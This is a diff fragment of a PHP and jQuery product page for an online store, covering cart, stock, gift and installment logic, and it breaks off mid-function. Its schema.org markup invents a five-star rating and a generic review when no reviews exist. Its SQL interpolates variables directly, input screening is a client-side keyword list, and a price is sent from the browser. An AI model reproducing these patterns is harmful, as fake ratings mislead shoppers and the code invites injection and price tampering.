+                                                                        echo '<div><br><span class="ribbon-2" style="background-color:#5823c6; color:#fff;" onclick="mensaje(\'combo\')">Combo</span>&nbsp;&nbsp;<span class="gray small">Cb. '.$combo_id.'</span></div>';
+                                                                    echo '</td>';
+                                                                echo '</tr>';
+                                                            echo '</table>';
+                                                        echo '</div>';
+                                                    echo '</div>';
+                                                echo '</div>'; 
+                                                $precio_normal = 0;
+                                            }
+                                        echo '</div>';
+                                        
+                                        echo '<button class="carousel-control-prev" type="button" data-bs-target="#mainCarousel" data-bs-slide="prev" style="width:1%"><i class="fa fa-2x fa-chevron-left" style="color: #fcbc00;"></i></button>';
+                                        echo '<button class="carousel-control-next" type="button" data-bs-target="#mainCarousel" data-bs-slide="next" style="width:1%"><i class="fa fa-2x fa-chevron-right" style="color: #fcbc00;"></i></button>';
+                                    echo '</div>';
+                                echo '</div>';
+                            echo '</div>';
+                        echo '</div>';
+                    }
+                ?>
+            </div>
+        </div>
+    </div><br/><br/> 
+<?php
+    }
+?>
+
+<!-- microdatos -->
+<div itemtype="https://schema.org/Product" itemscope>
+<?php
+// name
+if ($color == "NO APLICA" || $color == "") { echo '<meta itemprop="name" content="'.strtoupper($identidad.' '.$marca.' '.$prod_modelo.' '.$nombre.' '.$prod_caracteristica_especial).'" />'; }
+else { echo '<meta itemprop="name" content="'.strtoupper($identidad.' '.$marca.' '.$prod_modelo.' '.$nombre.' '.$prod_caracteristica_especial.' COLOR '.$color).'" />'; }
+// img
+$query = mysqli_query($conexion, "SELECT multi_imagen FROM productos_multimedia WHERE multi_estado = 'a' AND id_prod = '$prod_id' AND multi_tipo = 'imagen' ORDER BY multi_posicion ASC;");
+while ($row = mysqli_fetch_array($query)) { echo '<link itemprop="image" href="'.$image_path.'/productos/sm/'.$row['multi_imagen'].'" />'; }
+?>
+<meta itemprop="description" content="<?= $prod_descripcion_corta; ?>" />
+<div itemprop="offers" itemtype="https://schema.org/Offer" itemscope>
+    <link itemprop="url" href="<?= $website_path.'producto.php?n='.$prod_id; ?>" />
+    <meta itemprop="availability" content="https://schema.org/InStock" />
+    <meta itemprop="priceCurrency" content="USD" />
+    <?php
+    if ($prod_nuevo != "1") { echo '<meta itemprop="itemCondition" content="https://schema.org/UsedCondition" />'; }
+    else { echo '<meta itemprop="itemCondition" content="https://schema.org/NewCondition" />'; }
+    ?>
+    <meta itemprop="price" content="<?php echo number_format((float) ($precio), 2, '.', ''); ?>" />
+    <?php
+    if(empty($promo_fecha)) { echo '<meta itemprop="priceValidUntil" content="'.date("Y").'-12-31" />'; }
+    else { echo '<meta itemprop="priceValidUntil" content="'.$promo_fecha.'" />'; }
+    ?>
+</div>
+<div itemprop="aggregateRating" itemtype="https://schema.org/AggregateRating" itemscope>
+    <?php
+        if ($opiniones_total > 0) { echo '<meta itemprop="reviewCount" content="'.$opiniones_total.'" />'; }
+        else { echo '<meta itemprop="reviewCount" content="5" />'; }
+        
+        if ($calificaciones > 0) { echo '<meta itemprop="ratingValue" content="'.($calificaciones * 20).'" />'; }
+        else { echo '<meta itemprop="ratingValue" content="5" />'; }
+    ?>
+</div>
+<div itemprop="review" itemtype="https://schema.org/Review" itemscope>
+  <div itemprop="author" itemtype="https://schema.org/Person" itemscope>
+    <meta itemprop="name" content="Kissu user" />
+  </div>
+  <div itemprop="reviewRating" itemtype="https://schema.org/Rating" itemscope>
+    <?php
+        if ($calificaciones > 0) { echo '<meta itemprop="ratingValue" content="'.number_format((float) ($calificaciones * 20), 0, '.', '').'" />'; }
+        else { echo '<meta itemprop="ratingValue" content="5" />'; }
+    ?>
+    <meta itemprop="bestRating" content="100" />
+  </div>
+</div>
+<meta itemprop="sku" content="<?= $prod_id; ?>" />
+<div itemprop="brand" itemtype="https://schema.org/Brand" itemscope>
+  <meta itemprop="name" content="<?= $marca; ?>" />
+</div>
+</div>
+<!-- /microdatos -->  
+    
+<?php
+    $query = mysqli_query($conexion, "SELECT banner_imagen, banner_enlace, banner_target FROM publicidad_banner WHERE banner_estado = 'a' AND banner_tipo = '11' ORDER BY banner_id DESC LIMIT 1; ");
+    if ($row = mysqli_fetch_array($query)) {
+        if ($row['banner_enlace'] == "#") {
+            echo '<img loading="lazy" style="width:100%;" src="'.$image_path.'/banners/'.$row['banner_imagen'].'" class="img img-reponsive" /><br/><br/>';
+        } else {
+            echo '<a href="'.$row['banner_enlace'].'" target="_'.$row['banner_target'].'">';
+                echo '<img loading="lazy" style="width:100%;" src="'.$image_path.'/banners/'.$row['banner_imagen'].'" class="img img-reponsive" />';
+            echo '</a><br/><br/>';
+        }        
+    }
+?>
+
+<section>
+    <div class="container">
+        <div class="row">
+            <div class="col-12 col-sm-12 col-md-1"></div>
+            <div class="col-10 col-sm-12">
+                <section id="descripcion" class="section"><br/>
+                    <div id="description"></div>
+                </section>
+
+                <section id="especificaciones" class="section"><br/>
+                    <div id="specs"></div>
+                </section>
+
+                <section id="preguntas" class="section"><br/><br/><br/><br/><br/><br/><br/><br/><br/>
+                    <div id="questions"></div>
+                </section>
+
+                <section id="relacionados" class="section"><br/><br/><br/><br/><br/><br/>
+                    <div id="related"></div>
+                </section>
+
+                <section id="opiniones" class="section"><br/><br/><br/><br/><br/><br/><br/>
+                    <div id="opinions"></div>
+                </section>
+
+            </div><br/><br/>
+            <div class="col-12 col-md-1"></div>
+        </div>
+    </div>
+</section>
+
+<div id="cargando">
+    <div class="loader-wrap">
+      <div class="loader"><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span><span class="loader-item"></span></div>
+    </div>
+</div>
+        
+<?php require 'scripts2.php'; ?>
+<script>
+    (function($){
+        $(document).ready(function() {
+            $('.xzoom, .xzoom-gallery').xzoom({
+                position:'right',
+                title:false,
+                zoomWidth:700,
+                zoomHeight:500,
+                Xoffset:0,
+                Yoffset:0,
+                scroll: false,
+                fadeIn:true,
+                defaultScale:0
+            });
+            
+            diferidos();
+            $("#description").load("_description.php?n=<?= $prod_id ?>");
+            $("#specs").load("_specs.php?n=<?= $prod_id ?>");
+            $("#questions").load("_questions.php?n=<?= $prod_id ?>");
+            $("#related").load("_related.php?n=<?= $prod_id ?>");
+            $("#opinions").load("_opinions.php?n=<?= $prod_id ?>");
+        });
+    })(jQuery);
+    
+    window.onscroll = function() {
+        var stickyOne = document.getElementById("stickyOne");
+        var stickyTwo = document.getElementById("stickyTwo");
+        if (window.scrollY > 0) {
+            stickyOne.style.paddingTop = "100px";
+            stickyTwo.style.paddingTop = "100px";
+        } else {
+            stickyOne.style.paddingTop = "0px";
+            stickyTwo.style.paddingTop = "0px";
+        }
+    };
+    
+    var id_ccart;
+    
+    <?php
+        if ($precio_promocion > 0) {
+            if ($promo_reloj == 1) {
+                if (strtotime($promo_fecha) > time()) {
+                    echo 'countdown('.$prod_id.', "'.$promo_fecha.'", 0);';
+                }
+            }
+        }
+    ?>
+    
+    function countdown(id,date,n) {
+        const second = 1000, minute = second * 60, hour = minute * 60, day = hour * 24;
+        let birthday = date;
+        let countDown = new Date(birthday).getTime(), x = setInterval(function() {
+            let now = new Date().getTime(), distance = countDown - now;
+            
+            let daysElement = document.getElementById("days_" + id);
+            if (daysElement) { daysElement.innerText = Math.floor(distance / (day)); }
+            
+            let hoursElement = document.getElementById("hours_" + id);
+            if (hoursElement) { hoursElement.innerText = Math.floor((distance % (day)) / (hour)); }
+            
+            let minutesElement = document.getElementById("minutes_" + id);
+            if (minutesElement) { minutesElement.innerText = Math.floor((distance % (hour)) / (minute)); }
+            
+            let secondsElement = document.getElementById("seconds_" + id);
+            if (secondsElement) { secondsElement.innerText = Math.floor((distance % (minute)) / second); }
+            
+            if (distance < 0) {
+                document.getElementById("countdown_"+id).style.display = "none";
+                clearInterval(x);
+            }
+        }, 0);
+    }
+    
+    function init() {
+        $("#preguntas").on("submit",function(e) {
+            pregunta(e);    
+        });
+        
+        $("#comentarios").on("submit",function(e) {
+            comentario(e);  
+        });
+    }
+    
+    function cambiaPrecio() {
+        var cantidad = document.getElementById("cantidad").value;
+        
+        if (cantidad < 0) {
+            cantidad = cantidad * (-1);
+            document.getElementById("cantidad").value = cantidad;
+        }
+        
+        <?php
+            if ($precio_promocion > 0) { $precio = $precio_promocion; }
+            else { $precio = $precio_efectivo; }
+            
+            if (!is_numeric($precio)) { $precio = 0; }
+        ?>
+        var precio = cantidad*<?php echo $precio; ?>;
+        document.getElementById("precio").innerHTML = precio.toFixed(2);
+        
+        var precio2 = cantidad*<?php echo ($precio*$comision_diferido); ?>;
+        document.getElementById("precio2").innerHTML = "$"+precio2.toFixed(2);
+    }
+    
+    function cambiaActive() {
+        for (var i = 0; i < 7; i++) {
+            if (document.getElementById("btn"+i) != null) {
+                document.getElementById("btn"+i).classList.remove("nav-link2");
+            }
+        }
+    }
+    
+    function pregunta(e) {
+        e.preventDefault(); //No se activará la acción predeterminada del evento
+        
+        if ($("#pregunta_mensaje").val() == "" || $("#pregunta_mensaje").val().includes(" AND ") || $("#pregunta_mensaje").val().includes(" OR ") || $("#pregunta_mensaje").val().includes(" IMG SRC ") || $("#pregunta_mensaje").val().includes(" < ") || $("#pregunta_mensaje").val().includes(" > ")) {
+            Swal.fire({
+                icon: 'error',
+                text: 'Hubo un error, por favor intenta de nuevo',
+                showConfirmButton: true
+            });
+        } else {
+            $.ajax({
+                url: "controladores/productos_preguntas.php?accion=insertar_usuario",
+                type: "POST",
+                data: new FormData(document.forms.namedItem("preguntas")),
+                contentType: false,
+                processData: false,
+                success: function (datos) {
+                    if (datos == "1") {
+                        Swal.fire({
+                            icon: 'success',
+                            text: 'Se ha registrado tu pregunta, te notificaremos cuando haya una respuesta',
+                            showConfirmButton: true
+                        }).then((result) => {
+                            location.href = "producto.php?n=<?= $prod_id ?>#preguntas";
+                        });
+                    } else {
+                        Swal.fire({
+                            icon: 'error',
+                            text: 'Hubo un error, por favor intenta de nuevo',
+                            showConfirmButton: true
+                        });
+                    }
+                }
+            });
+        }
+    }
+    
+    function comentario(e) {
+        e.preventDefault(); //No se activará la acción predeterminada del evento
+        $.ajax({
+            url: "controladores/productos_comentarios.php?accion=guardar_web",
+            type: "POST",
+            data: new FormData(document.forms.namedItem("comentarios")),
+            contentType: false,
+            processData: false,
+            success: function (datos) {
+                if (datos == "1") {
+                    Swal.fire({
+                        icon: 'success',
+                        text: 'Se ha registrado tu comentario',
+                        showConfirmButton: false,
+                        showCloseButton: true
+                    });
+                } else {
+                    Swal.fire({
+                        icon: 'error',
+                        text: 'No se pudo registrar tu comentario, por favor intente de nuevo',
+                        showConfirmButton: false,
+                        showCloseButton: true
+                    });
+                }
+            }
+        });
+    }
+    
+    function cambia_foto2(foto) {
+        $('#foto2').attr('src','<?php echo $image_path.'/productos/lg/'; ?>'+foto);
+    }
+    
+
+    function arrowToLeft() {
+        $("#carouselWrapper").animate({
+            scrollLeft: "-=200"
+        }, 150);
+    }
+
+    function arrowToRight() {
+        $("#carouselWrapper").animate({
+            scrollLeft: "+=200"
+        }, 150);
+    }
+
+    function comprar(productId) {
+        $("#cargando").show();
+        let prod_referencia = <?= ($prod_codigo_referencia > 0)? $prod_codigo_referencia: 0 ?>;
+        let persona = <?= ($persona_id > 0)? $persona_id: 0 ?>;
+        let cantidad = $("#cantidad").val();
+
+        if (cantidad < 1) {
+            cantidad = 1;
+            $("#cargando").hide();
+            Swal.fire({
+                icon: "error",
+                text: "Debes seleccionar una cantidad",
+                showConfirmButton: false,
+                showCloseButton: true
+            });
+            return;
+        }
+
+        if (prod_referencia > 0) {
+            $.post("controladores/productos_front.php?accion=mostrar_stock", 
+                { prod_id: prod_referencia })
+                .done(function(response) {
+                    try {
+                        let stock = JSON.parse(response);
+                        if (!stock || typeof stock.total === 'undefined') {
+                            throw new Error('Respuesta inválida del servidor');
+                        }
+                        
+                        let stock_disponible = stock.total;
+                        console.log("Cantidad solicitada:", cantidad);
+                        console.log("Stock disponible:", stock_disponible);
+                        
+                        if (parseInt(cantidad) > parseInt(stock_disponible)) {
+                            $("#cargando").hide();
+                            $("#cantidad").val(stock_disponible);
+                            Swal.fire({
+                                icon: "warning",
+                                title: "Stock insuficiente",
+                                html: `Solo tenemos <b>${stock_disponible}</b> unidades disponibles.<br>Hemos ajustado la cantidad automáticamente.`,
+                                showConfirmButton: false,
+                                showCloseButton: true
+                            });
+                            return;
+                        } else {
+                            verificarRegalo(productId, cantidad);
+                        }
+                    } catch (error) {
+                        $("#cargando").hide();
+                        Swal.fire({
+                            icon: "error",
+                            text: "Error al procesar la respuesta del servidor",
+                            showConfirmButton: false,
+                            showCloseButton: true
+                        });
+                    }
+                })
+                .fail(function(jqXHR, textStatus, errorThrown) {
+                    $("#cargando").hide();
+                    Swal.fire({
+                        icon: "error",
+                        text: "Error al verificar el stock",
+                        showConfirmButton: false,
+                        showCloseButton: true
+                    });
+                });
+        } else {
+            $("#cargando").hide();
+            Swal.fire({
+                icon: "error",
+                text: "Producto no válido",
+                showConfirmButton: false,
+                showCloseButton: true
+            });
+        }
+    }
+
+    function verificarRegalo(productId, cantidad) {
+        var persona = <?= ($persona_id > 0)? $persona_id: 0 ?>;
+
+        $.post("controladores/carrito.php?accion=verificar_regalo", { id_prod: productId }, function(response) {
+            var data = JSON.parse(response);
+
+            // Verificar si el producto tiene regalos
+            if (data.regalos && data.regalos.length > 0) {
+                if (data.regalos.length > 0) {
+                    if (persona > 0) {
+                        agregarProductoYRegalosAlCarrito(productId, cantidad, data.regalos);
+                    } else {
+                        agregarProductoYRegalosAlCarritoOffline(productId, cantidad, data.regalos);
+                    }
+                } else {
+                    Swal.fire({
+                        icon: "warning",
+                        text: "No hay suficiente stock de regalos disponibles, te agregaremos los que queden",
+                        showConfirmButton: true
+                    }).then((result) => {
+                        if (result.isConfirmed) {
+                            if (persona > 0) {
+                                agregarProductoAlCarrito(productId, cantidad);
+                            } else {
+                                agregarProductoAlCarritoOffline(productId, cantidad);
+                            }
+                        }
+                    });
+                }
+            } else {
+                if (persona > 0) {
+                    agregarProductoAlCarrito(productId, cantidad);
+                } else {
+                    agregarProductoAlCarritoOffline(productId, cantidad);
+                }
+            }
+        });
+    }
+
+    function agregarProductoAlCarrito(productId, cantidad) {
+        $("#cargando").show();
+        var persona = <?= ($persona_id > 0)? $persona_id: 0 ?>;
+        var idImpuesto = 13;
+
+        // Función para agregar el producto al carrito
+        function agregarAlCarrito(id_ccart) {
+            var data = {
+                dcart_cantidad: cantidad,
+                dcart_tipo: 1,
+                id_prod: productId,
+                id_ci: idImpuesto,
+                id_ccart: id_ccart
+            };
+
+            $.post("controladores/carrito.php?accion=agregar_carrito", data)
+                .done(function(response) {
+                    $("#cargando").hide();
+                    if (response === "1") {
+                        ver_carrito_div(true);
+                        vista_previa_carrito();
+                    } else {
+                        throw new Error("Error al agregar al carrito");
+                    }
+                })
+                .fail(function() {
+                    $("#cargando").hide();
+                    Swal.fire({
+                        icon: "error",
+                        text: "Error al conectar con el servidor",
+                        showConfirmButton: true
+                    });
+                });
+        }
+
+        // Si el usuario está logueado, obtener el ID del carrito primero
+        if (persona > 0) {
+            $.post("controladores/carrito.php?accion=carrito_numero")
+                .done(function(response) {
+                    try {
+                        var num = JSON.parse(response);
+                        if (num && num.ccart_id) {
+                            agregarAlCarrito(num.ccart_id);
+                        } else {
+                            throw new Error("No se pudo obtener el ID del carrito");
+                        }
+                    } catch (error) {
+                        $("#cargando").hide();
+                        Swal.fire({
+                            icon: "error",
+                            text: "Error al procesar la respuesta del servidor",
+                            showConfirmButton: true
+                        });
+                    }
+                })
+                .fail(function() {
+                    $("#cargando").hide();
+                    Swal.fire({
+                        icon: "error",
+                        text: "Error al conectar con el servidor",
+                        showConfirmButton: true
+                    });
+                });
+        }
+    }
+
+    function agregarProductoYRegalosAlCarrito(productId, cantidad, regalos) {
+        $("#cargando").show();
+        var persona = <?= ($persona_id > 0)? $persona_id: 0 ?>;
+        var idImpuesto = 13;
+
+        // Función para agregar el producto principal
+        function agregarProductoPrincipal(id_ccart) {
+            let dataProducto = {
+                dcart_cantidad: cantidad,
+                dcart_tipo: 1,
+                id_prod: productId,
+                id_ci: idImpuesto,
+                id_ccart: id_ccart
+            };
+
+            return $.post("controladores/carrito.php?accion=agregar_carrito", dataProducto);
+        }
+
+        // Si el usuario está logueado, obtener el ID del carrito primero
+        if (persona > 0) {
+            $.post("controladores/carrito.php?accion=carrito_numero")
+                .done(function(response) {
+                    try {
+                        var num = JSON.parse(response);
+                        if (num && num.ccart_id) {
+                            agregarProductoPrincipal(num.ccart_id)
+                                .done(function(responseProducto) {
+                                    if (responseProducto === "1") {
+                                        // Agregar los regalos al carrito
+                                        agregarRegalosAlCarrito(num.ccart_id, regalos);
+                                        ver_numero_carrito();
+                                    } else {
+                                        throw new Error("Error al agregar el producto principal");
+                                    }
+                                })
+                                .fail(function() {
+                                    $("#cargando").hide();
+                                    Swal.fire({
+                                        icon: "error",
+                                        text: "Error al agregar el producto al carrito",
+                                        showConfirmButton: true
+                                    });
+                                });
+                        } else {
+                            throw new Error("No se pudo obtener el ID del carrito");
+                        }
+                    } catch (error) {
+                        $("#cargando").hide();
+                        Swal.fire({
+                            icon: "error",
+                            text: "Error al procesar la respuesta del servidor",
+                            showConfirmButton: true
+                        });
+                    }
+                })
+                .fail(function() {
+                    $("#cargando").hide();
+                    Swal.fire({
+                        icon: "error",
+                        text: "Error al conectar con el servidor",
+                        showConfirmButton: true
+                    });
+                });
+        }
+    }
+
+    function agregarRegalosAlCarrito(id_ccart, regalos) {
+        $("#cargando").show();
+        let regalosAgregados = 0;
+        let errores = 0;
+        let idImpuesto = 13;
+
+        // Validar que tengamos regalos para agregar
+        if (!regalos || !Array.isArray(regalos) || regalos.length === 0) {
+            $("#cargando").hide();
+            finalizarProcesoAgregado(0);
+            return;
+        }
+
+        // Obtener la cantidad del producto
+        let cantidad = 1;
+        let campoCantidad = document.getElementById("cantidad");
+        if (campoCantidad) {
+            let valor = parseInt(campoCantidad.value, 10);
+            if (!isNaN(valor) && valor > 0) {
+                cantidad = valor;
+            }
+        }
+
+        // Función para agregar un regalo individual
+        function agregarRegalo(regalo) {
+            return new Promise((resolve, reject) => {
+                let dataRegalo = {
+                    dcart_cantidad: regalo.cantidad * cantidad,
+                    dcart_tipo: 1,
+                    id_prod: regalo.id,
+                    id_ci: idImpuesto,
+                    id_ccart: id_ccart
+                };
+
+                $.post("controladores/carrito.php?accion=agregar_regalo", dataRegalo)
+                    .done(function(response) {
+                        if (response === "1") {
+                            resolve(true);
+                        } else {
+                            resolve(false);
+                        }
+                    })
+                    .fail(function() {
+                        reject(new Error("Error al agregar regalo"));
+                    });
+            });
+        }
+
+        // Procesar todos los regalos en paralelo
+        Promise.all(regalos.map(regalo => agregarRegalo(regalo)))
+            .then(results => {
+                regalosAgregados = results.filter(result => result === true).length;
+                errores = results.filter(result => result === false).length;
+                finalizarProcesoAgregado(errores);
+            })
+            .catch(error => {
+                $("#cargando").hide();
+                Swal.fire({
+                    icon: "error",
+                    text: "Error al procesar los regalos",
+                    showConfirmButton: true
+                });
+            });
+    }
+    
+    function finalizarProcesoAgregado(errores) {
+        $("#cargando").hide();
+        
+        // Validar que errores sea un número
+        if (typeof errores !== 'number' || isNaN(errores)) {
+            errores = 0;
+        }
+
+        if (errores === 0) {
+            ver_carrito_div(true);
+            vista_previa_carrito();
+        } else {
+            // Caso de error - Algunos regalos no se pudieron agregar
+            Swal.fire({
+                icon: "warning",
+                title: "Atención",
+                html: `Se agregaron algunos regalos pero hubo ${errores} error(es).<br>¿Deseas intentar nuevamente?`,
+                showConfirmButton: true,
+                confirmButtonColor: "#0b5ed7",
+                confirmButtonText: "Reintentar",
+                showCancelButton: true,
+                cancelButtonText: "Cancelar",
+                cancelButtonColor: "#d33",
+                allowOutsideClick: false,
+                allowEscapeKey: false
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    window.location.reload();
+                } else {
+                    ver_carrito_div(true);
+                    vista_previa_carrito();
+                }
+            });
+        }
+    }
+
+    function agregarProductoAlCarritoOffline(productId, cantidad) {
+        console.log("estoy en la funcion agregarProductoAlCarritoOffline");
+        if (cantidad > 0) {
+            var nuevoProducto = `${productId}_${cantidad}_0_1`;
+            var cart = localStorage.getItem('cart') || '';
+            if (cart) { cart += `,${nuevoProducto}`; }
+            else { cart = nuevoProducto; }
+            
+            $("#cargando").hide();
+            localStorage.setItem('cart', cart);
+            ver_carrito_div(true);
+            ver_numero_carrito_offline();
+            vista_previa_carrito_offline();
+            subtotal_carrito_offline();
+        } else {
+            Swal.fire({
+                icon: "error",
+                text: "Este producto se puede comprar solo por WhatsApp",
+                showConfirmButton: false,
+                showCloseButton: true
+            });
+        }
+    }
+    
+    function agregarProductoYRegalosAlCarritoOffline(productId, cantidad, regalos) {
+        try {
+            // Validaciones iniciales
+            if (!productId || !cantidad) {
+                throw new Error('ID del producto y cantidad son requeridos');
+            }
+
+            if (cantidad <= 0) {
+                Swal.fire({
+                    icon: "error",
+                    text: "Este producto se puede comprar solo por WhatsApp",
+                    showConfirmButton: false,
+                    showCloseButton: true
+                });
+                return;
+            }
+
+            // Obtener carrito actual
+            let cart = localStorage.getItem('cart');
+            let productos = cart ? cart.split(',') : [];
+
+            // Verificar si el producto ya existe en el carrito
+            const productoExistente = productos.find(item => {
+                const [id] = item.split('_');
+                return id === productId.toString();
+            });
+
+            if (productoExistente) {
+                Swal.fire({
+                    icon: "warning",
+                    title: "Producto existente",
+                    text: "Este producto ya está en tu carrito",
+                    showConfirmButton: true
+                });
+                return;
+            }
+
+            // Preparar nuevo producto (formato: productID_cantidad_descuento_tipo)
+            const nuevoProducto = `${productId}_${cantidad}_0_1`;
+            productos.push(nuevoProducto);
+
+            // Agregar regalos si existen
+            if (regalos && Array.isArray(regalos) && regalos.length > 0) {
+                regalos.forEach(regalo => {
+                    if (regalo && typeof regalo === 'object' && regalo.id && regalo.cantidad) {
+                        const cantidadRegalo = parseInt(regalo.cantidad) * parseInt(cantidad);
+                        const nuevoRegalo = `${regalo.id}_${cantidadRegalo}_100_1`;
+                        productos.push(nuevoRegalo);
+                    }
+                });
+            }
+
+            // Guardar carrito actualizado
+            localStorage.setItem('cart', productos.join(','));
+
+            // Actualizar UI
+            $("#cargando").hide();
+            ver_carrito_div(true);
+            ver_numero_carrito_offline();
+            vista_previa_carrito_offline();
+            subtotal_carrito_offline();
+        } catch (error) {
+            console.error("Error al agregar al carrito:", error);
+            $("#cargando").hide();
+            Swal.fire({
+                icon: "error",
+                title: "Error",
+                text: "Hubo un error al agregar el producto al carrito",
+                showConfirmButton: true,
+                confirmButtonColor: '#0b5ed7'
+            });
+        }
+    }
+
+    function cambiaCant() {
+        let cantidadSolicitada = parseInt($("#cantidad").val(), 10);
+        let id = <?= ($prod_codigo_referencia > 0)? $prod_codigo_referencia: 0 ?>;
+
+        $.post("controladores/productos_front.php?accion=mostrar_stock", { prod_id: id }, function(response) {
+            response = JSON.parse(response);
+            let stockDisponible = response.cant_stotal;
+
+            if (cantidadSolicitada > stockDisponible) {
+                Swal.fire({
+                    icon: "error",
+                    html: "Al momento puedo entregarte "+stockDisponible+" unidades.<br>Si necesitas más escríbenos por WhatsApp",
+                    showConfirmButton: false
+                }).then(() => {
+                    $("#cantidad").val(stockDisponible); // Ajustar el valor del campo de cantidad
+                });
+            }
+        });
+    }
+
+    function ver_video() {
+        $("#rowVideo").show();
+        $("#rowFotos").hide();
+    }
+    
+    function cambia_foto(n) {
+        $("#rowVideo").hide();
+        $("#rowFotos").show();
+        var iframe = document.getElementById('youtube-video');
+        document.getElementById("hrefZoom").href="fotos.php?id=<?php echo $prod_id; ?>&foto="+n;
+        if (iframe && iframe.contentWindow && iframe.contentWindow.postMessage) {
+            iframe.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}', '*');
+        }
+    }
+    
+    function ver_detalle(n) {
+        Swal.fire({
+            html: '<div id="detalle"></div>',
+            showCancelButton: false,
+            showConfirmButton: false,
+            showCloseButton: true,
+            width: '950px'
+        });
+        $("#detalle").load("producto_detalle.php?n="+n);
+    }
+    
+    function verEnlaceEtiqueta(url) {
+        Swal.fire({
+            html: '<div id="divEtiqueta"></div>',
+            showCloseButton: true,
+            showCancelButton: false,
+            showConfirmButton: false,
+            width: '1360px',
+            willClose: () => {
+                location.href="";
+            }
+        });
+        $("#divEtiqueta").load(url);
+    }
+    
+    function comprar_combo(combo) {
+        $("#cargando").show();
+        let cantidad = 1;
+        let precio = 0;
+        
+        $.post("../controladores/productos_front.php?accion=consulta_combo", { combo_id: combo }, function(response) {
+            response = JSON.parse(response);
+            precio = response.combo_precio;
+            
+            var persona = <?= ($persona_id > 0)? $persona_id: 0 ?>;
+            if (persona > 0) { // con sesión
+                $.post("../controladores/carrito.php?accion=comprar_combo", { dcart_cantidad:cantidad, dcart_precio1: precio, id_prod: combo, id_ccart: id_ccart }, function(response) {
+                    $("#cargando").hide();
+                    if (response == "1") {
+                        ver_carrito_div(true);
+                        vista_previa_carrito();
+                    } else {
+                        Swal.fire({
+                            icon: "error",
+                            text: "Hubo un error, por favor intenta de nuevo",
+                            showConfirmButton: true
+                        });
+                    }
+                });
+            } else { // sin sesión
+                if (cantidad > 0) {
+                    var nuevoCombo = `${combo}_${cantidad}_0_2`;
+                    var cart = localStorage.getItem('cart') || '';
+                    cart = (cart) ? `${cart},${nuevoCombo}` : nuevoCombo;
+
+                    $("#cargando").hide();
+                    localStorage.setItem('cart', cart);
+                    ver_carrito_div(true);
+                    ver_numero_carrito_offline();
+                    vista_previa_carrito_offline();
+                    subtotal_carrito_offline();
+                } else {
+                    Swal.fire({
+                        icon: "error",
+                        text: "La cantidad debe ser mayor que 0",
+                        showConfirmButton: false,
+                        showCloseButton: true
+                    });
+                }
+            }
+        });
+    }
+    
+    function diferidos() {
+        let valorBase = <?= $precio*$comision_diferido ?>;
+        if (valorBase > 0) {
+          $.ajax({
+            url: '../controladores/tarjetas_comisiones.php?accion=listar',
+            method: 'POST',
+            dataType: 'json',
+            success: function(comisiones) {
+                comisiones = comisiones.filter(({ meses }) => meses !== 1);
+                comisiones.sort((a, b) => a.meses - b.meses);
+
+                let html = '<select id="selectDiferidos" class="form-control-sm" style="margin-top:8px; color:#707070; border-color:#b9b2b2; background-color:#fff; width: fit-content; max-width: 120%;">';
+                comisiones.forEach(({ meses, interes }) => {
+                    const totalConInt = valorBase * interes;
+                    const cuota      = totalConInt / meses;
+                    html += 
+                        `<option value="${meses}">` +
+                          `${meses} meses de $${cuota.toFixed(2)} — Total: $${totalConInt.toFixed(2)}` +
+                        `</option>`;
+                });
+                html += '</select>';
+                $("#diferidosContent").html(html);
+            },
+            error: function(err) {
+                $("#diferidosContent").html(
+                    '<div class="text-danger">No se pudo cargar las meses. Vuelve a intentar.</div>'
+                );
+            }
+          });
+        } else {
+            $("#diferidosContent").html(
+                '<div class="text-warning">Monto inválido para calcular cuotas.</div>'
+            );
+        }
+    }
+    
+    <?php
+        $mostrar_comentarios = isset($_REQUEST["comen"])? $_REQUEST["comen"] : "";
+        if ($mostrar_comentarios == "true") { echo 'comentario_nuevo('.$prod_id.');'; }
+    ?>
+
+    <?php if ($_SESSION["persona_grupo_socio"] == 2 || $_SESSION["persona_grupo_socio"] == 4 || $_SESSION["persona_grupo_socio"] == 6) { ?>
+        
+        function verEditar() {
+            Swal.fire({
+                html: 
+                    '<br><p class="big bold blue precio">Editar información del producto</p>'+
+                    '<table class="table">'+
+                        '<tr><td><a href="#" onclick="editaDatos()"><i class="fa fa-barcode"></i>&nbsp;&nbsp; Información básica</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaPrecio()"><i class="fa fa-credit-card"></i>&nbsp;&nbsp; Precio</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaDescripcion()"><i class="fa fa-bars"></i>&nbsp;&nbsp; Descripción</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaFotos()"><i class="fa fa-file-image-o"></i>&nbsp;&nbsp; Multimedia</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaEspecificaciones()"><i class="fa fa-table"></i>&nbsp;&nbsp; Especificaciones</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaRecomendaciones()"><i class="fa fa-thumbs-up"></i>&nbsp;&nbsp; Recomendaciones</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaEtiquetas()"><i class="fa fa-certificate"></i>&nbsp;&nbsp; Etiquetas</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaOpiniones()"><i class="fa fa-commenting"></i>&nbsp;&nbsp; Opiniones</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaPreguntas()"><i class="fa fa-question-circle"></i>&nbsp;&nbsp; Preguntas</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaRegalos()"><i class="fa fa-gift"></i>&nbsp;&nbsp; Regalos</a></td></tr>'+
+                        '<tr><td><a href="#" onclick="editaEstado()"><i class="fa fa-check-circle"></i>&nbsp;&nbsp; Estado</a></td></tr>'+
+                    '</table>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false
+            });
+        }
+        
+        function editaDatos() {
+            Swal.fire({
+                title: 'Información básica del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
+                willClose: () => {
+                    location.href="";
+                }
+            });
+            $("#edit").load("tienda/frontEditor/producto_base.php?id=<?= $prod_id ?>");
+        }
+        
+        function editaPrecio() {
+            Swal.fire({
+                title: 'Precios del producto',
+                html: '<div id="edit"></div>',
+                showCloseButton: true,
+                showCancelButton: false,
+                showConfirmButton: false,
